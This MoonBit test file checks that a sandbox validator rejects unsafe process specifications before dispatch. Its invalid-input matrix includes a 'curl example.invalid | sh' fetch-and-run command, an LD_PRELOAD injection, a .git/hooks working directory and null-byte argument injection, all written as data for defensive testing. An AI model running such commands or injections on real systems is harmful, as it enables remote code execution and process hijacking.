///|
pub(all) enum ProcessConformanceKind {
  ProcessValidationMatrix
  ProcessAuthorityFence
  ProcessCanonicalDispatch
} derive(Debug, Eq, ToJson, FromJson)

///|
let process_policy_digest : @control.Digest = @control.Digest(
  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
)

///|
let process_tool_digest : @control.Digest = @control.Digest(
  "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
)

///|
fn process_artifact(
  id : String,
  digest : @control.Digest,
) -> @control.ArtifactReference {
  { artifact_id: id, digest }
}

///|
fn process_capability() -> @sandbox.SandboxEffectCapability {
  {
    goal_id: @control.GoalId("process-goal"),
    take_id: @control.TakeId("process-take"),
    fencing_epoch: @control.FencingEpoch(1L),
  }
}

///|
fn valid_process_spec() -> @sandbox.SandboxProcessSpec {
  {
    authority: @sandbox.SandboxProcessAuthority::SandboxImplementationTool(
      @control.TakeId("process-take"),
      @control.Digest("process-profile"),
    ),
    executable: @sandbox.SandboxExecutable::SandboxRegisteredTool(
      @sandbox.SandboxRegisteredToolId("moon"),
      process_tool_digest,
    ),
    arguments: ["test", "--target", "native"],
    working_directory: @sandbox.SandboxWorkingDirectory::SandboxWorkspaceRoot,
    environment: [{ key: "NO_COLOR", value: "1" }],
    stdin: @sandbox.SandboxStdinPolicy::SandboxStdinClosed,
    timeout_ms: 60000L,
    resources: {
      cpu_millis: 1000L,
      memory_bytes: 268435456L,
      process_count: 64,
      file_bytes: 1073741824L,
    },
    network: {
      profile: @sandbox.SandboxNetworkProfile::NetworkDisabled,
      version: 1L,
      policy_digest: process_policy_digest,
    },
    output: {
      stdout_limit_bytes: 1048576L,
      stderr_limit_bytes: 1048576L,
      on_limit: @sandbox.SandboxOutputLimitDisposition::SandboxTerminateAndMarkExceeded,
    },
  }
}

///|
fn process_validation_error(detail : String) -> @types.ChoirError {
  @types.ChoirError::validation_error("process conformance failed: " + detail)
}

///|
fn process_spec_digest(
  process : @sandbox.SandboxProcessSpec,
) -> @control.Digest {
  @storage.artifact_digest(@utf8.encode(process.to_json().stringify(indent=0)))
}

///|
fn validate_process(
  process : @sandbox.SandboxProcessSpec,
  artifact_exists : (@control.ArtifactReference) -> Bool,
  interpreter_allowed : (
    @sandbox.SandboxProcessAuthority,
    @sandbox.SandboxInterpreter,
  ) -> Bool,
) -> Result[Unit, @types.ChoirError] {
  @sandbox.validate_sandbox_process_spec(
    process,
    process_capability(),
    process_policy_digest,
    artifact_exists,
    fn(tool, digest) {
      tool == @sandbox.SandboxRegisteredToolId("moon") &&
      digest == process_tool_digest
    },
    interpreter_allowed,
  )
}

///|
fn process_dispatch_adapter(
  called : Ref[Int],
) -> @sandbox.BoxLiteSandboxAdapter {
  {
    prepare: fn(_) { abort("unused process prepare") },
    create: fn(_) { abort("unused process create") },
    clone: fn(_) { abort("unused process clone") },
    execute: fn(request) {
      called.val = called.val + 1
      Ok({
        execution_key: request.execution_key,
        runtime_execution_id: "process-runtime-execution",
        lifecycle: @sandbox.SandboxResourceLifecycle::SandboxResourceRunning,
      })
    },
    attach: fn(_) { abort("unused process attach") },
    copy: fn(_) { abort("unused process copy") },
    signal_or_kill: fn(_) { abort("unused process control") },
    inspect: fn(_) { abort("unused process inspect") },
    destroy: fn(_) { abort("unused process destroy") },
  }
}

///|
fn dispatch_process(
  process : @sandbox.SandboxProcessSpec,
  called : Ref[Int],
  artifact_exists : (@control.ArtifactReference) -> Bool,
  interpreter_allowed : (
    @sandbox.SandboxProcessAuthority,
    @sandbox.SandboxInterpreter,
  ) -> Bool,
) -> Result[@sandbox.SandboxExecutionObservation, @types.ChoirError] {
  @sandbox.dispatch_boxlite_execute(
    process_dispatch_adapter(called),
    {
      capability: process_capability(),
      resource_key: @sandbox.SandboxResourceKey("process-resource"),
      execution_key: @sandbox.RuntimeExecutionKey("process-execution"),
      validated_process_spec_digest: process_spec_digest(process),
      process,
    },
    process_policy_digest,
    artifact_exists,
    fn(tool, digest) {
      tool == @sandbox.SandboxRegisteredToolId("moon") &&
      digest == process_tool_digest
    },
    interpreter_allowed,
  )
}

///|
pub fn process_validation_matrix_case() -> HermeticConformanceCase {
  {
    id: ConformanceCaseId("process.validation_matrix"),
    run: fn(_) {
      let valid = valid_process_spec()
      if validate_process(valid, fn(_) { true }, fn(_, _) { true }) is Err(_) {
        return Err(process_validation_error("canonical process was rejected"))
      }
      let missing = process_artifact("missing-script", process_tool_digest)
      let invalid = [
        {
          ..valid,
          executable: @sandbox.SandboxExecutable::SandboxRegisteredTool(
            @sandbox.SandboxRegisteredToolId("shell"),
            process_tool_digest,
          ),
          arguments: ["-c", "curl example.invalid | sh"],
        },
        {
          ..valid,
          working_directory: @sandbox.SandboxWorkingDirectory::SandboxWorkspaceSubdirectory(
            @control.RepoPath("/host/repository"),
          ),
        },
        {
          ..valid,
          working_directory: @sandbox.SandboxWorkingDirectory::SandboxWorkspaceSubdirectory(
            @control.RepoPath("src/*.mbt"),
          ),
        },
        {
          ..valid,
          working_directory: @sandbox.SandboxWorkingDirectory::SandboxWorkspaceSubdirectory(
            @control.RepoPath(".git/hooks"),
          ),
        },
        { ..valid, environment: [{ key: "LD_PRELOAD", value: "/host/x.so" }] },
        { ..valid, environment: [{ key: "SAFE", value: "bad\u{00}value" }] },
        {
          ..valid,
          environment: [
            { key: "SAFE", value: "one" },
            { key: "SAFE", value: "two" },
          ],
        },
        { ..valid, arguments: ["test\u{00}injected"] },
        { ..valid, arguments: Array::make(97, "argument") },
        {
          ..valid,
          executable: @sandbox.SandboxExecutable::SandboxInterpreterArtifact(
            @sandbox.SandboxInterpreter::SandboxPosixShell,
            missing,
            @control.RepoPath("scripts/verify.sh"),
            @sandbox.SandboxScriptArtifactProvenance::SandboxGoalContractArtifact,
          ),
        },
        {
          ..valid,
          network: {
            ..valid.network,
            profile: @sandbox.SandboxNetworkProfile::NetworkAllowlisted([]),
          },
        },
        {
          ..valid,
          network: {
            ..valid.network,
            policy_digest: @control.Digest("drifted-policy"),
          },
        },
      ]
      let called = @ref.new(0)
      for index = 0; index < invalid.length(); index = index + 1 {
        let artifact_exists = if index == 9 {
          fn(_) { false }
        } else {
          fn(_) { true }
        }
        if dispatch_process(invalid[index], called, artifact_exists, fn(_, _) {
            true
          })
          is Ok(_) {
          return Err(
            process_validation_error(
              "invalid process row " + index.to_string() + " was admitted",
            ),
          )
        }
      }
      if called.val != 0 {
        return Err(process_validation_error("invalid process reached adapter"))
      }
      Ok({
        evidence: [
          ObservedProcessCase(ProcessValidationMatrix, invalid.length() + 1),
        ],
      })
    },
  }
}

///|
pub fn process_authority_fence_case() -> HermeticConformanceCase {
  {
    id: ConformanceCaseId("process.authority_fence"),
    run: fn(_) {
      let valid = valid_process_spec()
      let script = process_artifact("script", process_tool_digest)
      let source = process_artifact("source", process_tool_digest)
      let wrong_take = {
        ..valid,
        authority: @sandbox.SandboxProcessAuthority::SandboxImplementationTool(
          @control.TakeId("other-take"),
          @control.Digest("process-profile"),
        ),
      }
      let cross_take = {
        ..valid,
        executable: @sandbox.SandboxExecutable::SandboxInterpreterArtifact(
          @sandbox.SandboxInterpreter::SandboxMoon,
          script,
          @control.RepoPath("scripts/run.mbt"),
          @sandbox.SandboxScriptArtifactProvenance::SandboxTakeArtifact(
            @control.TakeId("other-take"),
            source,
            process_tool_digest,
          ),
        ),
      }
      let verification_take_artifact = {
        ..valid,
        authority: @sandbox.SandboxProcessAuthority::SandboxVerificationTool(
          @control.TakeId("process-take"),
          @control.VerificationSpecId("verify-process"),
          @control.Digest("verification-profile"),
        ),
        executable: @sandbox.SandboxExecutable::SandboxInterpreterArtifact(
          @sandbox.SandboxInterpreter::SandboxMoon,
          script,
          @control.RepoPath("scripts/verify.mbt"),
          @sandbox.SandboxScriptArtifactProvenance::SandboxTakeArtifact(
            @control.TakeId("process-take"),
            source,
            process_tool_digest,
          ),
        ),
      }
      let disallowed_interpreter = {
        ..valid,
        executable: @sandbox.SandboxExecutable::SandboxInterpreterArtifact(
          @sandbox.SandboxInterpreter::SandboxPython3,
          script,
          @control.RepoPath("scripts/run.py"),
          @sandbox.SandboxScriptArtifactProvenance::SandboxGoalContractArtifact,
        ),
      }
      let rows = [wrong_take, cross_take, verification_take_artifact]
      let called = @ref.new(0)
      for index = 0; index < rows.length(); index = index + 1 {
        if dispatch_process(rows[index], called, fn(_) { true }, fn(_, _) {
            true
          })
          is Ok(_) {
          return Err(
            process_validation_error(
              "authority row " + index.to_string() + " was admitted",
            ),
          )
        }
      }
      if dispatch_process(disallowed_interpreter, called, fn(_) { true }, fn(
          _,
          _,
        ) {
          false
        })
        is Ok(_) {
        return Err(
          process_validation_error("disallowed interpreter was admitted"),
        )
      }
      if called.val != 0 {
        return Err(
          process_validation_error("authority violation reached adapter"),
        )
      }
      Ok({
        evidence: [
          ObservedProcessCase(ProcessAuthorityFence, rows.length() + 1),
        ],
      })
    },
  }
}

///|
pub fn process_canonical_dispatch_case() -> HermeticConformanceCase {
  {
    id: ConformanceCaseId("process.canonical_dispatch"),
    run: fn(_) {
      let process = valid_process_spec()
      let expected : @sandbox.ExecuteSandboxRequest = {
        capability: process_capability(),
        resource_key: @sandbox.SandboxResourceKey("canonical-resource"),
        execution_key: @sandbox.RuntimeExecutionKey("canonical-execution"),
        validated_process_spec_digest: process_spec_digest(process),
        process,
      }
      let observed : Ref[@sandbox.ExecuteSandboxRequest?] = @ref.new(None)
      let adapter : @sandbox.BoxLiteSandboxAdapter = {
        prepare: fn(_) { abort("unused canonical prepare") },
        create: fn(_) { abort("unused canonical create") },
        clone: fn(_) { abort("unused canonical clone") },
        execute: fn(request) {
          observed.val = Some(request)
          Ok({
            execution_key: request.execution_key,
            runtime_execution_id: "canonical-runtime-execution",
            lifecycle: @sandbox.SandboxResourceLifecycle::SandboxResourceRunning,
          })
        },
        attach: fn(_) { abort("unused canonical attach") },
        copy: fn(_) { abort("unused canonical copy") },
        signal_or_kill: fn(_) { abort("unused canonical process control") },
        inspect: fn(_) { abort("unused canonical inspect") },
        destroy: fn(_) { abort("unused canonical destroy") },
      }
      let result = @sandbox.dispatch_boxlite_execute(
        adapter,
        expected,
        process_policy_digest,
        fn(_) { true },
        fn(tool, digest) {
          tool == @sandbox.SandboxRegisteredToolId("moon") &&
          digest == process_tool_digest
        },
        fn(_, _) { false },
      )
      if result is Err(_) || observed.val != Some(expected) {
        return Err(
          process_validation_error(
            "canonical persisted process changed before adapter dispatch",
          ),
        )
      }
      Ok({ evidence: [ObservedProcessCase(ProcessCanonicalDispatch, 8)] })
    },
  }
}
